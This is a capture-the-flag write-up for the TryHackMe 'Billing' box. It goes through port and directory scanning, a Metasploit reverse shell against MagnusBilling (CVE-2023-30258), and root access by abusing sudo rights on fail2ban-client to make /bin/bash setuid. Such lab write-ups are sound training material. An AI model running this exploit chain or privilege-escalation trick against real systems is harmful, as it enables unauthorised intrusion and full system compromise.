# Billing - TryHackMe Writeup

## Introduction
This box offered a classic web exploitation path, starting from directory enumeration to remote code execution via a known vulnerability in a billing system. With some privilege escalation tricks involving <b>fail2ban</b>, we were able to achieve full root access.

## Port Scanning
We begin with a full port scan:
```python
nmap -sC -sV -p- -T4 10.10.214.36
```
Open ports found:
```python
22 SSH
80 HTTP
3306 MySQL
5038 Asterisk Manager Interface
```
##  Web Enumeration
Visiting the web server revealed a login form at /mbilling, but no valid credentials were immediately available.

Let's enumerate directories:
```python
gobuster dir -u http://10.10.214.36/mbilling/ -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt
```
Interesting result:

/robots.txt — This hinted at hidden or sensitive content.

## Exploiting Asterisk (MagnusBilling RCE)
We searched Metasploit for known vulnerabilities in MagnusBilling (a VoIP billing system):
```python
msfconsole
search Asterisk
```
Found module:
```python
exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
```
Using it:
```python
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
set RHOSTS 10.10.214.36
set LHOST <your_ip>
exploit
```
Reverse shell obtained.

Reading User Flag
```python
cat user.txt
```
## Privilege Escalation
Checking for sudo permissions:
```python
sudo -l
```
Output:
```python
(ALL) NOPASSWD: /usr/bin/fail2ban-client
```
We exploited fail2ban-client to escalate privileges:
```python
sudo /usr/bin/fail2ban-client status

sudo /usr/bin/fail2ban-client get ip-blacklist actions

sudo /usr/bin/fail2ban-client set ip-blacklist addaction evil

sudo /usr/bin/fail2ban-client set ip-blacklist action evil actionban "chmod +s /bin/bash"

sudo /usr/bin/fail2ban-client set ip-blacklist banip 1.2.3.5
```
Now we have a root shell:
```python
/bin/bash -p
whoami
# root
```
## Conclusion
This box combined a web-based remote code execution with a creative privilege escalation via fail2ban. It was a great example of chaining misconfigurations and known CVEs to gain full system compromise.
```python
cat /root/root.txt
```
